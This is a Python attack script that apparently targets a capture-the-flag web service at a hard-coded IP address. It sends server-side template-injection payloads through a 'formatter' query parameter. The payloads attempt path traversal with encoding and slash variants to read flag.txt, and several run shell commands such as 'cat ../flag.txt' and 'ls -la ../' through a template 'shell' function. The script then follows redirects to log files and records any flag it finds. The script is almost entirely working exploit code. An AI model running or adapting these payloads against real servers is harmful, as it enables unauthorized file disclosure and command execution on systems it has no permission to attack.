import requests
import urllib.parse

url = "http://152.118.201.242:9012/exec"  # Change to target URL

payloads = [
    # Basic parent directory traversal
    '{{file "../flag.txt"}}',
    '{{readFile "../flag.txt"}}',
    
    # Multiple encoding variations
    '{{file "..%2fflag.txt"}}',
    '{{file "%2e%2e/flag.txt"}}',
    '{{file "..%5cflag.txt"}}',
    
    # Double dot variations
    '{{file "....//flag.txt"}}',
    '{{file "../././flag.txt"}}',
    
    # Absolute path attempts (if we can guess the structure)
    '{{file "/app/../flag.txt"}}',
    '{{file "/proc/self/cwd/../flag.txt"}}',
    
    # Try using template functions
    '[{{range $b := file "../flag.txt"}}{{$b}}{{end}}]',
    '{{$f := file "../flag.txt"}}{{$f}}',
    
    # Using shell commands if available
    '{{shell "cat ../flag.txt"}}',
    '{{shell "cd .. && cat flag.txt"}}',
    '{{shell "ls -la ../ | grep flag.txt"}}',
    
    # Try directory listing first
    '{{shell "ls -la ../"}}',
    
    # Multiple levels up in case of nested directories
    '{{file "../../flag.txt"}}',
    '{{file "../../../flag.txt"}}',
    
    # Try with OS specific path separators
    '{{file "..\\/flag.txt"}}',
    
    # Try with URL encoding of ../
    '{{file "%2e%2e%2fflag.txt"}}',
    
    # Try with different slashes
    '{{file "..//flag.txt"}}',
    '{{file "../\\flag.txt"}}',
    
    # Try to list parent directory contents
    '{{range $f := shell "ls -la ../"}}{{$f}}{{end}}',
    
    # Try reading directory contents programmatically
    '{{$d := file "../"}}{{range $f := $d}}{{$f}}{{end}}'
]

for payload in payloads:
    try:
        encoded_payload = urllib.parse.quote(payload)
        r = requests.get(f"{url}?formatter={encoded_payload}", allow_redirects=False)
        print(f"\nTrying payload: {payload}")
        print(f"Status: {r.status_code}")
        print(f"Response: {r.text[:200]}")  # First 200 chars of response
        
        # If we get redirected, follow the log file
        if r.status_code == 302:
            log_path = r.headers['Location']
            log_url = f"http://152.118.201.242:9012{log_path}"
            log_response = requests.get(log_url)
            print(f"Log file content: {log_response.text[:200]}")
            
            # Store successful payloads and their results
            if "flag{" in log_response.text or "HTB{" in log_response.text or "CTF{" in log_response.text:
                print("!!! POSSIBLE FLAG FOUND !!!")
                with open("successful_payloads.txt", "a") as f:
                    f.write(f"Payload: {payload}\nResult: {log_response.text}\n\n")
                    
    except Exception as e:
        print(f"Error with payload {payload}: {str(e)}")
